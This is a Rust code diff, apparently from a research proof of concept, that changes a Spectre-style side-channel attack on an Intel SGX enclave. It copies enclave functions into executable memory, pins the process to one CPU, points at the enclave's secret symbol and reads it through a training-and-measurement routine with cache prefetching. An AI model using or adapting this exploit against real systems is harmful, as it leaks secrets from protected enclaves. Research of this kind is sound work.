@@ -29,9 +29,11 @@ extern crate capstone;
 use capstone::prelude::*;
 
 extern crate nix;
-//use nix::sched::{sched_setaffinity, CpuSet};
+#[cfg(not(feature = "multithread"))]
+use nix::sched::{sched_setaffinity, CpuSet};
 use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
-//use nix::unistd::Pid;
+#[cfg(not(feature = "multithread"))]
+use nix::unistd::Pid;
 
 extern crate libc;
 use libc::c_void;
@@ -50,7 +52,7 @@ extern "C" {
 fn init_enclave() -> SgxResult<SgxEnclave> {
     let mut launch_token: sgx_launch_token_t = [0; 1024];
     let mut launch_token_updated: i32 = 0;
-    let debug = 1;
+    let debug = 0;
     let mut misc_attr = sgx_misc_attribute_t {
         secs_attr: sgx_attributes_t { flags: 0, xfrm: 0 },
         misc_select: 0,
@@ -66,8 +68,16 @@ fn init_enclave() -> SgxResult<SgxEnclave> {
 
 static mut ENCLAVE: SgxEnclave =
     unsafe { std::mem::transmute([1u8; std::mem::size_of::<SgxEnclave>()]) };
+static mut TARGET: usize = 0;
 
 fn main() -> std::io::Result<()> {
+    #[cfg(not(feature = "multithread"))]
+    {
+        let mut cpuset = CpuSet::new();
+        cpuset.set(0).unwrap();
+        sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
+    }
+
     unsafe {
         let tmp_enclave = match init_enclave() {
             Ok(r) => {
@@ -140,9 +150,12 @@ fn main() -> std::io::Result<()> {
     let mut secret_sym = goblin::elf::Sym::default();
     let mut spectre_limit_sym = goblin::elf::Sym::default();
 
-    let mut jb_offset = 0;
-    let mut jb_dst_addr = 0;
-    let mut ret_offset = 0;
+    //let mut jb_offset = 0;
+    //let mut jb_dst_addr = 0;
+    //let mut ret_offset = 0;
+
+    let mut access_memory_spectre_offset = 0;
+    let mut access_memory_spectre_size = 0;
 
     let mut spectre_test_offset = 0;
     let mut spectre_test_size = 0;
@@ -156,11 +169,12 @@ fn main() -> std::io::Result<()> {
         } else if symbol_name == "SPECTRE_LIMIT" {
             spectre_limit_sym = sym;
         } else if symbol_name == "access_memory_spectre" {
-            spectre_test_offset = sym.st_value as usize;
-            spectre_test_size = sym.st_size as usize;
+            access_memory_spectre_offset = sym.st_value as usize;
+            access_memory_spectre_size = sym.st_size as usize;
 
+            /*
             let asm_code =
-                &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];
+                &enclave_binary[access_memory_spectre_offset..access_memory_spectre_offset + access_memory_spectre_size];
 
             println!("function code: {:?}", asm_code);
             let insns = cs
@@ -187,14 +201,17 @@ fn main() -> std::io::Result<()> {
                     break;
                 }
             }
+            */
+        } else if symbol_name == "spectre_test" {
+            spectre_test_offset = sym.st_value as usize;
+            spectre_test_size = sym.st_size as usize;
         }
     }
 
-    println!("ret_offset: 0x{:x}", ret_offset);
-    println!("jb_offset: 0x{:x}", jb_offset);
-    println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
-
-    println!("spectre_test_offset: 0x{:x}", spectre_test_offset);
+    println!(
+        "access_memory_spectre_offset: 0x{:x}",
+        access_memory_spectre_offset
+    );
 
     let base_32bit_offset = (secret_full_addr - secret_sym.st_value) & ((1 << 32) - 1);
     println!("base_32bit_offset: 0x{:x}", base_32bit_offset);
@@ -245,23 +262,30 @@ fn main() -> std::io::Result<()> {
         measurement_array_addr: usize,
         target_addr: usize,
     ) = unsafe {
-        let dst_addr = &mut mapped_array[spectre_test_offset] as *mut u8;
+        let dst_addr = &mut mapped_array[access_memory_spectre_offset] as *mut u8;
 
         std::ptr::copy(
-            &enclave_binary[spectre_test_offset] as *const u8,
+            &enclave_binary[access_memory_spectre_offset] as *const u8,
             dst_addr,
+            access_memory_spectre_size,
+        );
+
+        // copy the spectre_test function
+        std::ptr::copy(
+            &enclave_binary[spectre_test_offset] as *const u8,
+            &mut mapped_array[spectre_test_offset],
             spectre_test_size,
         );
 
         // we need to add the statics too if we want the function to work well
         std::ptr::copy(
             minidow::MINIDOW_SECRET as *const u8,
-            &mut mapped_array[minidow_secret_sym.st_value as usize] as *mut u8,
+            &mut mapped_array[minidow_secret_sym.st_value as usize],
             minidow_secret_sym.st_size as usize,
         );
         std::ptr::copy(
             &enclave_binary[secret_sym.st_value as usize] as *const u8,
-            &mut mapped_array[secret_sym.st_value as usize] as *mut u8,
+            &mut mapped_array[secret_sym.st_value as usize],
             secret_sym.st_size as usize,
         );
         for i in 0..128 {
@@ -270,24 +294,28 @@ fn main() -> std::io::Result<()> {
         }
 
         // I'm not sadistic enough to put the function in RWX memory.
-        println!(
-            "Mapping {} bytes as executable at {:p}",
-            spectre_test_size, dst_addr
+        let map_rx = |addr: usize, size: usize| {
+            println!(
+                "Mapping {} bytes as executable at {:p}",
+                size, addr as *const u8
+            );
+            mprotect(
+                // align on a page boundary
+                (addr & (!((1 << 12) - 1))) as *mut c_void,
+                size + (addr & ((1 << 12) - 1)),
+                ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
+            )
+            .unwrap();
+        };
+        map_rx(dst_addr as usize, access_memory_spectre_size);
+        map_rx(
+            &mapped_array[spectre_test_offset] as *const _ as usize,
+            spectre_test_size,
         );
-        mprotect(
-            // align on a page boundary
-            ((dst_addr as usize) & (!((1 << 12) - 1))) as *mut c_void,
-            spectre_test_size + ((dst_addr as usize) & ((1 << 12) - 1)),
-            ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
-        )
-        .unwrap();
 
+        //std::mem::transmute(&mapped_array[spectre_test_offset])
         std::mem::transmute(dst_addr)
     };
-
-    //let mut cpuset = CpuSet::new();
-    //cpuset.set(0).unwrap();
-    //sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
 
     setup_measurements();
     // yay, training is now possible!
@@ -308,12 +336,14 @@ fn main() -> std::io::Result<()> {
         minidow_secret_array_addr_in_enclave
     );
 
-    let target = secret_full_addr as usize;
-    //let target = secret_sym.st_value as usize
-    //    + top_32bit_offset as usize
-    //    + mapped_array as *const _ as usize;
-    //let target = minidow_secret_array_addr_in_enclave as usize + 120;
-    println!("target: 0x{:x}", target);
+    unsafe {
+        TARGET = secret_full_addr as usize;
+        //let target = secret_sym.st_value as usize
+        //    + top_32bit_offset as usize
+        //    + mapped_array as *const _ as usize;
+        //let target = minidow_secret_array_addr_in_enclave as usize + 120;
+        println!("target: 0x{:x}", TARGET);
+    }
 
     let spectre = Spectre::new(
         Some(spectre_test_training_fun),
@@ -334,12 +364,15 @@ fn main() -> std::io::Result<()> {
         "0x{:x}",
         minidow::read_ptr(
             &spectre,
-            || {
-                //unsafe {
-                //    std::arch::x86_64::_mm_clflush(BRANCH_DST_ADDR);
-                //}
+            || unsafe {
+                // try to prefetch, in the hoep it will help
+                std::arch::x86_64::_mm_prefetch(
+                    TARGET as *const i8,
+                    std::arch::x86_64::_MM_HINT_T0,
+                );
+                //std::arch::x86_64::_mm_clflush(BRANCH_DST_ADDR);
             },
-            target
+            unsafe { TARGET }
         )
     );
 
